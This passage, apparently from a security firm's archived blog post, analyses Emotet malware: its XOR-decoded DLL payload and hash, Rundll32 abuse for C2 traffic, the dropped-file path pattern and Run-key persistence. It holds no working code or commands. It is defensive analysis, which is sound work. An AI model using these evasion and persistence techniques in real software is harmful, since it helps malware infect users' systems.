<p><strong>Extracting the Emotet Payload</strong></p>
<p></p>
<p></p>
<ul>
<li>The PE image hidden in the loader has a hash value of <strong>9DA12DAF87DFF61804EDF0ECE87E1DA2</strong>, which is PE image DLL32 and has no exported functions.&nbsp;</li>
<li>The instructions in the DLL are dynamically decoded using XOR to evade detection.&nbsp;</li>
<li>There are no hits on VirusTotal for this hash.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh3.googleusercontent.com/rBKqHgj3gT5hXqCPSIpygQdjI50h8rwU3NbuC30x7XSMAG8PUNwnyvzuZ8rjndICSTBhwR44BQg6-CloZAUKSgV0_o47Y-KM5i4xtEePuDOORBox6ddEx2DNpfPYnMBKSnZR7c7F" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh3.googleusercontent.com/rBKqHgj3gT5hXqCPSIpygQdjI50h8rwU3NbuC30x7XSMAG8PUNwnyvzuZ8rjndICSTBhwR44BQg6-CloZAUKSgV0_o47Y-KM5i4xtEePuDOORBox6ddEx2DNpfPYnMBKSnZR7c7F" alt="" data-pagespeed-url-hash="534405638"/></noscript></figure>
<p></p>
<p></p>
<h3>System-Wide Activity</h3>
<p></p>
<p></p>
<ul>
<li>The Emotet malware spawns a new process of <strong>Rundll32</strong> with a new command line. This is responsible for maintaining connection with the attacker’s C2 (Command and Control) server.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh6.googleusercontent.com/EA7vfncvyr7YWZlbiXWQiXBMYhnGdgn2WgaFDGq4m7ZDF6ZzlsQLWYRk8uywiSXmKwQt4Q68Sh8AVm7lb8fcXpzbG_-IIz9spBfJcnT0pqYEbfcPrwqHihEBWy1ti4WttzNdGVJg" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh6.googleusercontent.com/EA7vfncvyr7YWZlbiXWQiXBMYhnGdgn2WgaFDGq4m7ZDF6ZzlsQLWYRk8uywiSXmKwQt4Q68Sh8AVm7lb8fcXpzbG_-IIz9spBfJcnT0pqYEbfcPrwqHihEBWy1ti4WttzNdGVJg" alt="" data-pagespeed-url-hash="3491419386"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>In the new command line shown below, we can see the malware has already been able to write the file in <strong>C:\Users\&lt;user&gt;\AppData\Local\&lt;Random_string&gt;\&lt;random&gt;.&lt;random_extension&gt;</strong>. We have confirmed that the file written in this extension is the same as the initial file dropped from the malicious document.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image size-full"><img width="485" height="158" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20485%20158'%3E%3C/svg%3E" alt="" class="wp-image-18625" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image19.png 485w, //cloudsek.com/wp-content/uploads/2021/12/image19-300x98.png 300w, //cloudsek.com/wp-content/uploads/2021/12/image19-150x49.png 150w" data-lazy-sizes="(max-width: 485px) 100vw, 485px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image19.png" data-pagespeed-url-hash="991898542" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="485" height="158" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image19.png" alt="" class="wp-image-18625" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image19.png 485w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image19-300x98.png 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image19-150x49.png 150w" sizes="(max-width: 485px) 100vw, 485px" data-pagespeed-url-hash="1505268940"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>It is not in the nature of the <strong>Rundll32</strong> system program to make network connections. However, because the malware is executed via <strong>Rundll32</strong>, we can see live traffic from it on the system, when it connects to the attacker’s Infrastructure.
</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image size-full"><img width="317" height="346" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20317%20346'%3E%3C/svg%3E" alt="" class="wp-image-18626" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image14.png 317w, //cloudsek.com/wp-content/uploads/2021/12/image14-275x300.png 275w, //cloudsek.com/wp-content/uploads/2021/12/image14-150x164.png 150w" data-lazy-sizes="(max-width: 317px) 100vw, 317px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image14.png" data-pagespeed-url-hash="1160499447" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="317" height="346" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image14.png" alt="" class="wp-image-18626" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image14.png 317w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image14-275x300.png 275w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image14-150x164.png 150w" sizes="(max-width: 317px) 100vw, 317px" data-pagespeed-url-hash="32769335"/></noscript></figure>
<p></p>
<p></p>
<figure class="wp-block-image size-large"><img width="1024" height="388" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20388'%3E%3C/svg%3E" alt="" class="wp-image-18627" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image22-1024x388.png 1024w, //cloudsek.com/wp-content/uploads/2021/12/image22-300x114.png 300w, //cloudsek.com/wp-content/uploads/2021/12/image22-768x291.png 768w, //cloudsek.com/wp-content/uploads/2021/12/image22-150x57.png 150w, //cloudsek.com/wp-content/uploads/2021/12/image22.png 1350w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image22-1024x388.png" data-pagespeed-url-hash="2385203355" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="1024" height="388" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22-1024x388.png" alt="" class="wp-image-18627" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22-1024x388.png 1024w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22-300x114.png 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22-768x291.png 768w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22-150x57.png 150w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image22.png 1350w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="3994640103"/></noscript><figcaption><em>Network activity of the malware making connections to external assets.</em></figcaption></figure>
<p></p>
<p></p>
<p></p>
<p></p>
<ul>
<li>The persistence mechanism employed by Emotet is a classic technique that utilizes the Run registry key. As mentioned above, a PE image is written to: <strong>C:\Users\&lt;user&gt;\AppData\Local\&lt;Random_string&gt;\</strong> directory as <strong>&lt;random_string&gt;.&lt;random_extension&gt;</strong>. After which, the <strong>Rundll32</strong> is abused to run the exported function in the DLL.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image size-large"><img width="1024" height="121" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20121'%3E%3C/svg%3E" alt="" class="wp-image-18628" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image16-1024x121.png 1024w, //cloudsek.com/wp-content/uploads/2021/12/image16-300x35.png 300w, //cloudsek.com/wp-content/uploads/2021/12/image16-768x90.png 768w, //cloudsek.com/wp-content/uploads/2021/12/image16-150x18.png 150w, //cloudsek.com/wp-content/uploads/2021/12/image16.png 1282w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image16-1024x121.png" data-pagespeed-url-hash="3043687240" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="1024" height="121" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16-1024x121.png" alt="" class="wp-image-18628" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16-1024x121.png 1024w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16-300x35.png 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16-768x90.png 768w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16-150x18.png 150w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image16.png 1282w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="581807903"/></noscript></figure>
<p></p>

<div class="uab-short-info">
Anandeshwar is a Threat Intelligence Researcher at CloudSEK. He is a strong advocate of offensive cybersecurity. He is fuelled by his passion for cyber threats in a global context. He dedicates much of his time on Try Hack Me/ Hack The Box/ Offensive Security Playground. He believes that &#8220;a strong mind starts with a strong body.&#8221; When he is not gymming, he finds time to nurture his passion for teaching. He also likes to travel and experience new cultures.</div><div class="uab-short-contact ">
